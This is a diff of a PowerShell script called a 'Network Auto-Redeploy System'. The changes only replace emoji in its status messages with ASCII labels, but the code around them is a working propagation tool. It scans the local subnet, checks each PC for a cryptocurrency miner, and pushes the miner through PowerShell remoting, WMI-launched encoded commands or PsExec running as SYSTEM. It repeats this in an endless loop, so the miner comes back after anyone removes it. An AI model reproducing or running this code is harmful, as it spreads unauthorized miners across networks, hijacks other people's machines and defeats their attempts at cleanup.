@@ -11,9 +11,9 @@ param(
     [string]$SubnetMask = "192.168.1.0/24"  # Auto-detect if not specified
 )
 
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host "           NETWORK AUTO-REDEPLOY SYSTEM" -ForegroundColor Cyan
-Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "This PC will automatically redeploy the miner to other PCs" -ForegroundColor Yellow
 Write-Host "on the network if they don't have it or it gets removed." -ForegroundColor Yellow
@@ -21,7 +21,7 @@ Write-Host ""
 
 # Check if deployment script exists
 if (-not (Test-Path $DeploymentScript)) {
-    Write-Host "❌ Deployment script not found: $DeploymentScript" -ForegroundColor Red
+    Write-Host "[X] Deployment script not found: $DeploymentScript" -ForegroundColor Red
     exit 1
 }
 
@@ -53,7 +53,7 @@ function Get-LocalSubnet {
 function Get-LivePCs {
     param([string]$Subnet)
     
-    Write-Host "🔍 Scanning network for live PCs..." -ForegroundColor Yellow
+    Write-Host "[SCAN] Scanning network for live PCs..." -ForegroundColor Yellow
     
     # Extract base IP and range
     $baseIP = ($Subnet -split '/')[0]
@@ -91,7 +91,7 @@ function Get-LivePCs {
         Remove-Job -Job $job -Force
     }
     
-    Write-Host "  ✅ Found $($livePCs.Count) live PC(s)" -ForegroundColor Green
+    Write-Host "  [OK] Found $($livePCs.Count) live PC(s)" -ForegroundColor Green
     
     return $livePCs
 }
@@ -150,7 +150,7 @@ function Deploy-ToPC {
     )
     
     try {
-        Write-Host "  📦 Deploying to: $ComputerName..." -ForegroundColor Cyan
+        Write-Host "  [DEPLOY] Deploying to: $ComputerName..." -ForegroundColor Cyan
         
         # Method 1: PowerShell Remoting (best)
         try {
@@ -166,7 +166,7 @@ function Deploy-ToPC {
             
             Remove-PSSession -Session $session
             
-            Write-Host "    ✅ Deployed via PS Remoting" -ForegroundColor Green
+            Write-Host "    [OK] Deployed via PS Remoting" -ForegroundColor Green
             return $true
             
         } catch {}
@@ -178,7 +178,7 @@ function Deploy-ToPC {
             
             Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -EncodedCommand $encodedScript" -ComputerName $ComputerName -ErrorAction Stop | Out-Null
             
-            Write-Host "    ✅ Deployed via WMI" -ForegroundColor Green
+            Write-Host "    [OK] Deployed via WMI" -ForegroundColor Green
             return $true
             
         } catch {}
@@ -188,17 +188,17 @@ function Deploy-ToPC {
             try {
                 & "$PSScriptRoot\PsExec.exe" -accepteula -d -s \\$ComputerName powershell.exe -ExecutionPolicy Bypass -File $ScriptPath 2>&1 | Out-Null
                 
-                Write-Host "    ✅ Deployed via PsExec" -ForegroundColor Green
+                Write-Host "    [OK] Deployed via PsExec" -ForegroundColor Green
                 return $true
                 
             } catch {}
         }
         
-        Write-Host "    ❌ All deployment methods failed" -ForegroundColor Red
+        Write-Host "    [X] All deployment methods failed" -ForegroundColor Red
         return $false
         
     } catch {
-        Write-Host "    ❌ Deployment failed: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "    [X] Deployment failed: $($_.Exception.Message)" -ForegroundColor Red
         return $false
     }
 }
@@ -217,9 +217,9 @@ $deployCount = 0
 while ($true) {
     try {
         $scanCount++
-        Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor DarkGray
+        Write-Host "================================================================" -ForegroundColor DarkGray
         Write-Host "SCAN #$scanCount - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Cyan
-        Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor DarkGray
+        Write-Host "================================================================" -ForegroundColor DarkGray
         
         # Auto-detect subnet if not specified
         if ($SubnetMask -eq "192.168.1.0/24" -or [string]::IsNullOrEmpty($SubnetMask)) {
@@ -231,7 +231,7 @@ while ($true) {
         $livePCs = Get-LivePCs -Subnet $SubnetMask
         
         if ($livePCs.Count -eq 0) {
-            Write-Host "⚠️  No PCs found on network" -ForegroundColor Yellow
+            Write-Host "[!]  No PCs found on network" -ForegroundColor Yellow
         } else {
             # Check each PC
             $needsDeployment = @()
@@ -242,24 +242,24 @@ while ($true) {
                     continue
                 }
                 
-                Write-Host "  🔍 Checking: $($pc.Hostname) ($($pc.IP))..." -ForegroundColor Gray -NoNewline
+                Write-Host "  [SCAN] Checking: $($pc.Hostname) ($($pc.IP))..." -ForegroundColor Gray -NoNewline
                 
                 $installed = Test-MinerInstalled -ComputerName $pc.Hostname
                 
                 if ($installed -eq $true) {
-                    Write-Host " ✅ ACTIVE" -ForegroundColor Green
+                    Write-Host " [OK] ACTIVE" -ForegroundColor Green
                 } elseif ($installed -eq $false) {
-                    Write-Host " ❌ MISSING" -ForegroundColor Red
+                    Write-Host " [X] MISSING" -ForegroundColor Red
                     $needsDeployment += $pc
                 } else {
-                    Write-Host " ⚠️  CAN'T CHECK" -ForegroundColor Yellow
+                    Write-Host " [!]  CAN'T CHECK" -ForegroundColor Yellow
                 }
             }
             
             # Deploy to PCs that need it
             if ($needsDeployment.Count -gt 0) {
                 Write-Host ""
-                Write-Host "🚀 AUTO-DEPLOYING to $($needsDeployment.Count) PC(s)..." -ForegroundColor Yellow
+                Write-Host "[START] AUTO-DEPLOYING to $($needsDeployment.Count) PC(s)..." -ForegroundColor Yellow
                 Write-Host ""
                 
                 foreach ($pc in $needsDeployment) {
@@ -271,11 +271,11 @@ while ($true) {
                 }
                 
                 Write-Host ""
-                Write-Host "✅ Deployment round complete" -ForegroundColor Green
+                Write-Host "[OK] Deployment round complete" -ForegroundColor Green
                 Write-Host "Total deployments: $deployCount" -ForegroundColor Cyan
             } else {
                 Write-Host ""
-                Write-Host "✅ All PCs have active miners" -ForegroundColor Green
+                Write-Host "[OK] All PCs have active miners" -ForegroundColor Green
             }
         }
         
@@ -286,7 +286,7 @@ while ($true) {
         Start-Sleep -Seconds $ScanInterval
         
     } catch {
-        Write-Host "❌ Error in monitoring loop: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[X] Error in monitoring loop: $($_.Exception.Message)" -ForegroundColor Red
         Start-Sleep -Seconds 60
     }
 }
